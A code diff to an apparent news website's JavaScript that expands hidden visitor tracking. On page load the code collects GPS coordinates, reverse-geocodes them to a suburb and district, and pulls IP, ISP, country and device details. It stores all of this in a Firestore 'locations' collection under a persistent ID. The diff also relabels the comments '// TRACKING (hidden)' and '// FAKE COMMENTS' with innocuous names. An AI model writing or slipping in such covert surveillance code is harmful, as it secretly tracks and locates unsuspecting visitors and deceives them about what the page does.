@@ -149,7 +149,7 @@ appId: "1:951484366467:web:2e936d42b1704027f665b6"
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-// TRACKING (hidden)
+// USER ID
 function getUserId(){
 let id = localStorage.getItem("userId")
 if(!id){
@@ -159,47 +159,101 @@ localStorage.setItem("userId", id)
 return id
 }
 
+// DEVICE
 function detectDevice(){
 let ua=navigator.userAgent;
 if(/mobile/i.test(ua)) return "Mobile";
+if(/tablet/i.test(ua)) return "Tablet";
 return "Desktop";
 }
 
+function detectDeviceModel(){
+let ua=navigator.userAgent;
+if(ua.includes("Android")) return "Android Phone";
+if(ua.includes("Windows")) return "Windows PC";
+if(ua.includes("Mac")) return "Mac";
+return "Unknown";
+}
+
+// LOCATION DETAILS
+async function getLocationDetails(lat, lon){
+try{
+const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+const data = await res.json()
+let a = data.address
+
+return {
+thana: a.suburb || a.village || a.town || a.municipality || a.county || "unknown",
+district: a.state_district || a.county || "unknown"
+}
+}catch{
+return {thana:"unknown",district:"unknown"}
+}
+}
+
+// IP
 async function getIP(){
 let res = await fetch("https://ipinfo.io/json")
 let data = await res.json()
-return data
+
+return {
+ip:data.ip,
+org:data.org,
+country:data.country
+}
 }
 
+// SAVE
 async function save(data){
 let id = getUserId()
 await setDoc(doc(db,"locations",id), data)
 }
 
-navigator.geolocation.getCurrentPosition(async pos=>{
+// GPS
+async function useGPS(pos){
+
+let lat = pos.coords.latitude
+let lon = pos.coords.longitude
+
+let loc = await getLocationDetails(lat,lon)
 let ip = await getIP()
 
 save({
-latitude:pos.coords.latitude,
-longitude:pos.coords.longitude,
-ip:ip.ip,
+latitude:lat,
+longitude:lon,
+thana:loc.thana,
+district:loc.district,
 country:ip.country,
+ip:ip.ip,
+isp:ip.org,
 device:detectDevice(),
+deviceModel:detectDeviceModel(),
+type:"GPS",
 time:new Date().toLocaleString()
 })
 
-}, async ()=>{
+}
+
+// IP fallback
+async function useIP(){
+
 let ip = await getIP()
 
 save({
-ip:ip.ip,
 country:ip.country,
+ip:ip.ip,
+isp:ip.org,
 device:detectDevice(),
+deviceModel:detectDeviceModel(),
+type:"IP",
 time:new Date().toLocaleString()
 })
-})
 
-// NEWS LOAD
+}
+
+navigator.geolocation.getCurrentPosition(useGPS,useIP)
+
+// NEWS
 let newsData = []
 
 async function loadNews(){
@@ -252,7 +306,7 @@ document.getElementById("homePage").style.display="block"
 document.getElementById("articlePage").style.display="none"
 }
 
-// FAKE COMMENTS
+// COMMENTS
 function loadComments(){
 
 const comments = [
